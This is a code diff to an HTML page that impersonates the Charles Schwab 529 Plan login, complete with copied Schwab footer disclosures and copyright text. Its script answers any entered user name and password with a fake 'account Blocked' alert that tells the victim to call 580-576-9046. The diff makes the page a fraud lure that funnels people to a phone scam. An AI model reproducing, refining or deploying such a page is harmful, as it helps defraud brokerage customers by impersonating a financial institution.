@@ -25,6 +25,13 @@
             margin: 0 auto 20px;
             width: 60px;
         }
+
+        .logo1{
+            position: relative;
+            display: block;
+            width: 80px;
+
+        }
         .login-box h2 {
             text-align: center;
         }
@@ -78,9 +85,47 @@
             color: blue;
             text-decoration: none;
         }
+
+        .footer {
+            background-color: #f4f4f4;
+            padding: 20px;
+            font-size: 14px;
+            color: #333;
+        }
+        .footer a {
+            color: #0073c6;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .footer .important-info {
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .footer .investment-info {
+            border: 1px solid #999;
+            padding: 10px;
+            background-color: #fff;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .footer-links {
+            margin: 15px 0;
+        }
+        .footer-links a {
+            margin-right: 15px;
+        }
+        .footer p {
+            margin: 5px 0;
+        }
+    
+
     </style>
 </head>
 <body>
+
+<div><img src="logo.png" alt="Charles Schwab Logo" class="logo1"></div>
     <div class="container">
         <header>
             <img src="logo.png" alt="Charles Schwab Logo" class="logo">
@@ -89,47 +134,81 @@
             <h2>Log In to your Schwab 529 Plan account</h2>
             <div class="error-box" id="error-box">Please specify a user name and password.</div>
             <form id="login-form">
-                <label for="username">User Name</label>
+                <label for="username">Login ID</label>
                 <input type="text" id="username" placeholder="Enter username">
                 <label for="password">Password</label>
                 <input type="password" id="password" placeholder="Enter password">
                 <div class="remember-me">
                     <input type="checkbox" id="remember">
-                    <label for="remember">Remember my user name</label>
+                    <label for="remember">Remember Login ID</label>
                 </div>
-                <a href="#" class="forgot-link">Forgot user name or password?</a>
+                <a href="https://client.schwab.com/Areas/Access/Login" class="forgot-link">Forgot Login ID or Password?</a>
                 <button type="submit" class="continue-btn">Continue</button>
             </form>
             <div class="info-links">
-                <a href="#">Enroll Now</a> | <a href="#">Create a user name and password</a> | <a href="#">Learn more</a>
+                <a href="https://client.schwab.com/Areas/Access/Login">Enroll Now</a> | <a href="https://client.schwab.com/Areas/Access/Login">Create a User ID and Password</a> | <a href="https://client.schwab.com/Areas/Access/Login">Learn more</a>
             </div>
         </div>
     </div>
+
+    <div class="footer">
+        <p class="important-info">
+            <strong>Important information about our relationship with you:</strong> 
+            <a href="#">Client Relationship Summaries</a>
+        </p>
+        <p>Our Client Relationship Summaries offer a brief summary of our services, fees, and obligations when we work with you in a broker-dealer or an investment advisory relationship. Learn more at 
+            <a href="#">schwab.com/transparency</a>.
+        </p>
+        
+        <div class="footer-links">
+            <a href="#">🔒 Schwab Safe®</a>
+            <a href="#">The Schwab Security Guarantee</a>
+            <a href="#">Schwab Homepage</a>
+        </div>
+    
+        <p><a href="#">Web Browser Information</a></p>
+    
+        <div class="investment-info">
+            Investment and Insurance Products Are: Not FDIC Insured • Not Insured by Any Federal Government Agency • 
+            Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or any of its Affiliates • Subject to Investment Risks, 
+            Including Possible Loss of Principal Amount Invested
+        </div>
+    
+        <p>Not all products and services listed are available outside the U.S. and some are subject to country-specific restrictions.</p>
+        
+        <p>Check the background of this firm or one of its investment professionals on 
+            <a href="#">FINRA's BrokerCheck</a>.
+        </p>
+        
+        <p>The Charles Schwab Corporation provides a full range of brokerage, banking and financial advisory services through its operating subsidiaries. 
+            Its broker-dealer subsidiary, Charles Schwab & Co., Inc. (<a href="#">member SIPC</a>), offers investment services and products, including Schwab brokerage accounts. 
+            Its banking subsidiary, Charles Schwab Bank (member FDIC and an Equal Housing Lender), provides deposit and lending services and products.
+        </p>
+    
+        <p>This site is designed for U.S. residents. Non-U.S. residents are subject to country-specific restrictions. 
+            Learn more about our services for <a href="#">non-U.S. residents</a>.
+        </p>
+    
+        <p>© 2024 Charles Schwab & Co., Inc. All rights reserved. Member <a href="#">SIPC</a>. Unauthorized access is prohibited. Usage will be monitored. (0124-3J4J)</p>
+    </div>
+
+    
     <script>
-        let loginAttempts = 0;
         document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault();
             var username = document.getElementById("username").value;
             var password = document.getElementById("password").value;
             var errorBox = document.getElementById("error-box");
-            
-            if (loginAttempts >= 3) {
-                alert("Your account is blocked. Please contact 580-576-9046 for further support.");
-                return;
-            }
-            
             if (username.trim() === "" || password.trim() === "") {
                 errorBox.style.display = "block";
             } else {
                 errorBox.style.display = "none";
-                loginAttempts++;
-                alert("Incorrect ID or Password. Please try again! Attempts left: " + (3 - loginAttempts));
-                
-                if (loginAttempts >= 3) {
-                    alert("Your account is blocked. Please contact 580-576-9046 for further support.");
-                }
+                alert("Your account has been Blocked! Please contact 580-576-9046 for further support.");
             }
         });
     </script>
 </body>
 </html>
+
+
+    
